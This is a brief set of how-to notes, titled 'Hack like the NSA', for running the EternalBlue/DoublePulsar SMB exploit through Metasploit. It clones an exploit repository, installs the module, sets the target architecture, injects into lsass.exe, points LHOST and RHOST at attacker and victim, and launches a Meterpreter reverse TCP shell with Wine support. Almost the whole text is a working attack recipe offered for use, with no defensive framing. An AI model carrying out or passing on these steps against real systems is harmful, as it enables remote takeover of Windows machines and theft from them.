# Eternalblue-Doublepulsar-Metasploit
# Hack like the NSA

on /root/Desktop/
git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
copy ruby file to /usr/share/metasploit-framework/module/exploits/windows/smb
use windows/smb/externalblue_doublepulsar
set eternalbluepath /root/Desktop
set doublepulsarpath /root/Desktop
set targetarchitecture x64
set processinject lsass.exe
set lhost local_ip
set rhost remote_ip
exploit

#make sure to setup wine folder
mkdir -p /root/.wine/drive_c/
#might needs the deps from the deps folder?!
#set the following:

set WINEPATH            /root/.wine/drive_c/ 
Payload options (windows/x64/meterpreter/reverse_tcp):
